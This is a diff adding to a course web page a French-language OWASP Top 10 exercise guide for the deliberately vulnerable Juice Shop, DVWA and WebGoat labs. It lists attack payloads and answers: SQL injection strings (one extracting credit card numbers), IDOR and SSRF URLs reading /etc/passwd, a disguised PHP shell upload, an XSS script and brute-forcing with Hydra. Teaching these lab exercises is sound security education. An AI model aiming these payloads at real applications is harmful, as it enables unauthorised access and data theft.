@@ -1203,6 +1203,221 @@ services:
                     </table>
                     <h3>Documentation pour les étudiants :</h3>
                     <p><span class="em">GUIDE.md</span> (avec toutes les sections) :</p>
+<pre><code># OWASP Top 10 - Lab d'Exercices (JuiceShop, DVWA, WebGoat)
+
+Ce document fournit un ensemble d'exercices pratiques couvrant chaque catégorie de l’**OWASP Top 10**, basés sur trois plateformes vulnérables : **OWASP Juice Shop**, **DVWA** et **OWASP WebGoat**.
+Chaque exercice inclut :
+- Objectif
+- Étapes à réaliser
+- Correction / Payloads
+
+---
+
+# Pré-requis
+
+## Plateformes utilisées
+- **OWASP Juice Shop** : <a href="https://owasp.org/www-project-juice-shop/" target="_blank">https://owasp.org/www-project-juice-shop/</a>
+- **DVWA** (Damn Vulnerable Web App)
+- **WebGoat** : <a href="https://owasp.org/www-project-webgoat/" target="_blank">https://owasp.org/www-project-webgoat/</a>
+
+## Outils recommandés
+- Burp Suite Community
+- Browser DevTools
+- Hydra / wfuzz / curl
+- Hashcat / John The Ripper
+- Docker (optionnel)
+
+---
+
+# A01 - Broken Access Control
+
+## Exercice 1 - Juice Shop : Accéder au profil d'un autre utilisateur
+**Objectif :** Tester une IDOR (Insecure Direct Object Reference)
+
+### Étapes
+1. Se connecter avec un compte normal.
+2. Ouvrir DevTools &#8594; onglet Network.
+3. Observer la requête : `/rest/user/whoami`.
+4. Modifier l'ID utilisateur dans la requête.
+
+### Correction
+```
+GET /rest/user/1
+```
+Renvoie le profil admin → contrôle d'accès cassé.
+
+---
+
+## Exercice 2 - DVWA : IDOR via paramètre GET
+**Objectif :** Manipuler un paramètre non protégé.
+
+### Payload
+```
+http://dvwa/vulnerabilities/view_profile.php?user_id=3
+```
+&#8594; Accès direct au profil.
+
+---
+
+# A02 - Cryptographic Failures
+
+## WebGoat - Crack de hash MD5
+**Objectif :** Comprendre faiblesse des algorithmes dépréciés.
+
+### Étapes
+1. Dans *Hashing &#8594; Password Cracking*, récupérer le hash.
+2. Utiliser Hashcat ou CrackStation.
+
+### Correction
+```
+5f4dcc3b5aa765d61d8327deb882cf99 &#8594; password
+```
+
+---
+
+# A03 - Injection
+
+## Exercice 1 - DVWA SQL Injection (Low)
+**Objectif :** Contourner une requête SQL vulnérable.
+
+### Payload
+```
+' OR 1 = 1 --
+```
+&#8594; Affiche tous les utilisateurs.
+
+---
+
+## Exercice 2 - Juice Shop : Bypass Login
+### Payload
+```
+' OR 1 = 1 --
+```
+&#8594; Connexion admin.
+
+---
+
+## Exercice 3 - WebGoat SQL Injection Avancée
+### Payload
+```
+' UNION SELECT null, cc_number, null, null FROM creditcard --
+```
+&#8594; Exfiltration du numéro de carte.
+
+---
+
+# A04 - Insecure Design
+
+## WebGoat - Manipulation de logique applicative
+**Objectif :** Modifier un prix côté client.
+
+### Étapes
+1. Ouvrir DevTools.
+2. Modifier un champ prix :
+```html
+&lt;input type="number" value="-99"&gt;
+```
+3. Soumettre la commande.
+
+### Résultat
+Achat validé &#8594; absence de validation serveur.
+
+---
+
+# A05 - Security Misconfiguration
+
+## DVWA - Accès à phpinfo()
+**Objectif :** Détecter exposition d'informations sensibles.
+
+### Étapes
+Accéder :
+```
+http://dvwa/phpinfo.php
+```
+
+### Risques
+- Version PHP
+- Modules actifs
+- Chemins système
+
+---
+
+# A06 - Vulnerable & Outdated Components
+
+## Juice Shop - Packages obsolètes accessibles
+**Objectif :** Identifier composants vulnérables.
+
+### Étapes
+Accéder au fichier exposé :
+```
+/ftp/package.json.bak
+```
+
+&#8594; Liste de dépendances vulnérables &#8594; flag.
+
+---
+
+# A07 - Identification & Authentication Failures
+
+## Juice Shop - Bruteforce du compte admin
+### Info utile
+```
+admin@juice-sh.op
+```
+
+### Action
+Lancer une attaque Hydra / Burp Intruder.
+
+### Résultat
+Mot de passe faible :
+```
+admin123
+```
+&#8594; Connexion admin.
+
+---
+
+# A08 - Software & Data Integrity Failures
+
+## WebGoat - Upload malveillant
+### Étapes
+1. Upload `shell.php.jpg`.
+2. Intercepter avec Burp.
+3. Modifier Content-Type en `image/jpeg`.
+
+### Résultat
+L'exécution du code serveur est acceptée.
+
+---
+
+# A09 - Security Logging & Monitoring Failures
+
+## Juice Shop - Détection XSS dans logs
+### Étapes
+Accéder à :
+```
+/support/logs
+```
+
+### Résultat
+Entrée log visible :
+```
+&lt;script&gt;alert(1)&lt;/script&gt;
+```
+&#8594; Attaque non filtrée.
+
+---
+
+# A10 - SSRF
+
+## WebGoat - Lecture de fichiers internes
+### Payload
+```
+http://localhost:8080/WebGoat/attack?url=file:///etc/passwd
+```
+&#8594; SSRF réussie.
+
+---</code></pre>
                 </article>
                 <article>
                     <h2 id="laboC">Labo C - Compilation, édition de liens, debugging & sécurité mémoire :</h2>
